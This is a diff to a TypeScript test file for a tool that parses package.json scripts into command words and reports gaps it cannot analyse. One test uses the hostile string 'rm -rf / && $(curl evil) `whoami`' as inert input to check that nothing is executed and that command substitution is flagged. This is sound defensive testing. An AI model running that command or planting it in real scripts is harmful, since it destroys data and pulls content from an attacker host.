@@ -2,7 +2,7 @@ import assert from "node:assert/strict";
 import { describe, it } from "node:test";
 import type { AdapterContext, Dependency, ProjectRef } from "@ghostdeps/core";
 import { memoryHandle } from "../testing/fs-handle.js";
-import { commandWords, findScriptUsages } from "./scripts.js";
+import { analyseScript, commandWords, findScriptUsages, scriptGaps } from "./scripts.js";
 
 const project = (path = "."): ProjectRef => ({
   path,
@@ -42,12 +42,60 @@ describe("commandWords", () => {
 
   it("never executes anything: hostile text is just words", () => {
     assert.equal(commandWords("x".repeat(100_000)).length, 1);
-    assert.deepEqual(commandWords("rm -rf / && $(curl evil) `whoami`"), [
-      "rm",
-      "$",
-      "curl",
-      "`whoami`",
+    const hostile = analyseScript("rm -rf / && $(curl evil) `whoami`");
+    assert.deepEqual(hostile.words, ["rm", "curl", "whoami"]);
+    assert.ok(hostile.gaps.includes("command substitution"));
+  });
+
+  it("follows --, sh -c and wrapper flags that take a value", () => {
+    assert.deepEqual(commandWords("dotenv -e .env -- tsc -b"), ["dotenv", "tsc"]);
+    assert.deepEqual(commandWords('sh -c "tsc && vitest run"'), ["tsc", "vitest"]);
+    assert.deepEqual(commandWords("bash -c 'eslint .'"), ["eslint"]);
+    assert.deepEqual(commandWords('nodemon -w src --exec "ts-node src/index.ts"'), [
+      "nodemon",
+      "ts-node",
     ]);
+    assert.deepEqual(commandWords("npx -p typescript tsc"), ["tsc"]);
+    assert.deepEqual(commandWords("pnpm --filter web exec vite build"), ["vite"]);
+    assert.deepEqual(commandWords("env -u CI jest"), ["jest"]);
+  });
+
+  it("reports what it could not analyse", () => {
+    assert.deepEqual(analyseScript("tsc -b && vitest run").gaps, []);
+    assert.deepEqual(analyseScript("cross-env --weird tsc").gaps, [
+      "cross-env: unrecognised flag --weird",
+    ]);
+    assert.deepEqual(analyseScript("sh ./scripts/build.sh").gaps, [
+      "sh runs ./scripts/build.sh, which is not read",
+    ]);
+    assert.deepEqual(analyseScript("node -e \"require('x')\"").gaps, [
+      "node evaluates inline code",
+    ]);
+    assert.deepEqual(analyseScript("eval $CMD").gaps, ["eval"]);
+    assert.deepEqual(analyseScript("echo 'open").gaps, ["unbalanced quote"]);
+    assert.deepEqual(analyseScript("x".repeat(9_000)).gaps, ["script too long"]);
+    // node running a repo file is source the import scanner reads.
+    assert.deepEqual(analyseScript("node scripts/gen.js").gaps, []);
+  });
+});
+
+describe("scriptGaps", () => {
+  it("is empty for plain scripts and names each gap otherwise", async () => {
+    const clean = ctx({ "package.json": JSON.stringify({ scripts: { b: "tsc", t: "vitest" } }) });
+    assert.deepEqual(await scriptGaps(clean, dep("typescript")), []);
+    const gappy = ctx({
+      "package.json": JSON.stringify({ scripts: { b: "tsc", ci: "sh ci.sh" } }),
+    });
+    assert.deepEqual(await scriptGaps(gappy, dep("typescript")), [
+      'package.json script "ci": sh runs ci.sh, which is not read',
+    ]);
+  });
+
+  it("an unreadable or malformed manifest is a gap", async () => {
+    assert.deepEqual(await scriptGaps(ctx({ "package.json": "{" }), dep("x")), [
+      "package.json: malformed",
+    ]);
+    assert.deepEqual(await scriptGaps(ctx({ "package.json": "{}" }), dep("x")), []);
   });
 });
 
